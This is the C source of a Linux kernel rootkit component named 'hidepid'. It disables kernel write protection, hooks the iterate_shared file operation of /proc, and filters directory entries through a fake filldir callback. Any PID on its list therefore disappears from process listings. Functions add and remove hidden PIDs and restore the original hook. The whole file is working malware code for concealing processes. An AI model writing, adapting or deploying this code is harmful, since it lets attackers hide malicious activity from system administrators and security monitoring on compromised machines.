#include "hidepid.h"

#define ROOT_PATH "/proc"

struct pids_struct
{
    struct list_head next;
    int pid;
};

// 链表
LIST_HEAD(pid_list);

int secret_procs_num = 0;

char *pid_absolute_path;
char *pid_full_name;
char *pid_buff;

#define set_file_op(op, path, new, old)                           \
    do                                                            \
    {                                                             \
        struct file *filp;                                        \
        struct file_operations *f_op;                             \
        pr_info("Opening the path: %s.\n", path);                 \
        filp = filp_open(path, O_RDONLY, 0);                      \
        if (IS_ERR(filp))                                         \
        {                                                         \
            pr_info("Failed to open %s with error %ld.\n",        \
                    path, PTR_ERR(filp));                         \
            old = NULL;                                           \
        }                                                         \
        else                                                      \
        {                                                         \
            pr_info("Succeeded in opening: %s\n", path);          \
            f_op = (struct file_operations *)filp->f_op;          \
            old = f_op->op;                                       \
                                                                  \
            pr_info("Changing file_op->" #op " from %p to %p.\n", \
                    old, new);                                    \
            disable_write_protection();                           \
            f_op->op = new;                                       \
            enable_write_protection();                            \
        }                                                         \
    } while (0)

int (*pid_real_iterate)(struct file *filp, struct dir_context *ctx);
int (*pid_real_filldir)(struct dir_context *ctx,
                    const char *name, int namlen,
                    loff_t offset, u64 ino, unsigned d_type);

int pid_fake_iterate(struct file *filp, struct dir_context *ctx);
int pid_fake_filldir(struct dir_context *ctx, const char *name, int namlen,
                 loff_t offset, u64 ino, unsigned d_type);

int init_hidepid(void)
{
    pid_full_name = kmalloc(PATH_MAX + 1, GFP_KERNEL);
    pid_buff = kmalloc(PATH_MAX + 1, GFP_KERNEL);

    set_file_op(iterate_shared, ROOT_PATH, pid_fake_iterate, pid_real_iterate);

    if (!pid_real_iterate)
    {
        return 0;
    }

    return 1;
}

void cleanup_hidepid(void)
{
    if (pid_real_iterate)
    {
        void *dummy;
        set_file_op(iterate_shared, ROOT_PATH, pid_real_iterate, dummy);
    }

    pr_info("Cleanup Hidepid\n");
}

int pid_fake_iterate(struct file *filp, struct dir_context *ctx)
{
    pid_real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = pid_fake_filldir;
    pid_absolute_path = d_path(&(filp->f_path), pid_buff, PATH_MAX);

    return pid_real_iterate(filp, ctx);
}

int pid_fake_filldir(struct dir_context *ctx, const char *name, int namlen,
                 loff_t offset, u64 ino, unsigned d_type)
{
    struct list_head *pos;
    struct pids_struct *entry;
    char *endp;
    long pid;
    int i = 0;

    pid = simple_strtol(name, &endp, 10);

    if (secret_procs_num > 0)
    {
        // 遍历链表
        list_for_each(pos, &pid_list)
        {
            entry = list_entry(pos, struct pids_struct, next);
            if (pid == entry->pid)
            {
                pr_info("Hiding pid: %ld", pid);
                return 0;
            }
        }
    }
    /* pr_cont("%s ", name); */

    return pid_real_filldir(ctx, name, namlen, offset, ino, d_type);
}

void add_hidepid(int pid)
{
    struct list_head *pos;
    struct pids_struct *entry, *temp;
    if (secret_procs_num > 0)
    {
        list_for_each(pos, &pid_list)
        {
            entry = list_entry(pos, struct pids_struct, next);
            if (pid == entry->pid)
            {
                pr_info("Pid has been hidden\n");
                return;
            }
        }
    }
    temp = kmalloc(sizeof(struct pids_struct), GFP_KERNEL);
    if (temp == NULL)
    {
        pr_info("Kmalloc fail\n");
        return;
    }
    temp->pid = pid;
    // 插入结点
    list_add(&temp->next, &pid_list);
    secret_procs_num++;
    pr_info("Pid %d is hidden\n", pid);
}

void delete_hidepid(int pid)
{
    struct list_head *pos;
    struct pids_struct *entry;
    if (secret_procs_num > 0)
    {
        list_for_each(pos, &pid_list)
        {
            entry = list_entry(pos, struct pids_struct, next);
            if (pid == entry->pid)
            {
                // 删除结点
                list_del(&entry->next);
                memset(entry, 0, sizeof(struct pids_struct));
                kfree(entry);
                entry = NULL;
                secret_procs_num--;
                pr_info("Pid %d is unhidden\n", pid);
                return;
            }
        }
        pr_info("Pid %d maybe not be hidden\n", pid);
    }
    else
    {
        pr_info("No pid was hidden\n");
    }
}